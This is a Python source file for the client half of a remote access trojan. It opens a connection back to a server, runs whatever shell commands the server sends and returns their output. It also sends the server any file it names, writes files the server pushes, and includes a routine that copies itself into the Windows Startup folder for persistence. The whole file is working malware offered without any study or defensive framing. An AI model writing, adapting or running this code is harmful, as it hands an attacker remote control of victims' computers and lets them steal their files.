import socket
import os
import subprocess
import time
import sys
import shutil


def add_to_startup():
    """Copy the script to the startup folder to ensure it runs on startup."""
    if sys.platform == "win32":
        # Windows startup folder path
        startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        script_name = os.path.basename(sys.argv[0])
        startup_path = os.path.join(startup_folder, script_name)

        # Copy script to the startup folder if it is not already there
        if not os.path.exists(startup_path):
            try:
                shutil.copy(sys.argv[0], startup_path)
                print("[+] Script added to startup successfully.")
            except Exception as e:
                print(f"[-] Error adding script to startup: {e}")
        else:
            print("[+] Script already exists in startup folder.")
    else:
        print("[-] This is only supported on Windows.")


def createConnection():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            return s
        except socket.error as e:
            time.sleep(5)



host = ""
port = 5050  # Must be the same port as on the server

while True:
    try:
        s = createConnection()
        while True:
            # Receive the command type (shell or file transfer)
            command_type = s.recv(1024).decode("utf-8")

            if command_type == "shell":
                # Handle shell commands
                data = s.recv(1024)
                if not data:
                    break

                command = data.decode("utf-8")

                if command[:2] == 'cd':
                    # Changing Directory
                    os.chdir(command[3:])

                # If There is a Command
                if len(command) > 0:
                    # Popen - Opens a Process
                    cmd = subprocess.Popen(command, shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    outputByte = cmd.stdout.read() + cmd.stderr.read()
                    outputString = str(outputByte, 'utf-8')

                    # Send the length of the output first
                    s.send(str.encode(str(len(outputString))))
                    s.recv(1024)  # Wait for acknowledgment

                    # Send the output in chunks
                    s.sendall(str.encode(outputString))

                    print(outputString)


            elif command_type == "download":

                # Handle file download

                file_name = s.recv(1024).decode("utf-8")

                print(f"Client: Received download request for file '{file_name}'")

                if os.path.exists(file_name):

                    with open(file_name, "rb") as file:

                        file_data = file.read()

                        s.sendall(file_data + b"<EOF>")  # Send file data with end marker

                    print(f"Client: File '{file_name}' sent to server.")

                else:

                    s.sendall(b"FILE_NOT_FOUND")  # Send a specific message if the file doesn't exist

                    print(f"Client: File '{file_name}' not found.")
            elif command_type == "upload":
                # Handle file upload
                try:
                    # Receive the file name first
                    file_name = s.recv(1024).decode("utf-8")
                    print(f"Client: Receiving file '{file_name}'")

                    # Open the file and write the received data to it
                    with open(file_name, "wb") as file:
                        while True:
                            file_data = s.recv(1024)
                            if file_data.endswith(b"<EOF>"):  # Check for end-of-file marker
                                file.write(file_data[:-5])  # Write data without the marker
                                break
                            file.write(file_data)

                    print(f"Client: File '{file_name}' uploaded successfully.")
                except Exception as e:
                    print(f"Client: Error uploading file: {e}")

    except socket.error as e:
        s.close()
        time.sleep(5)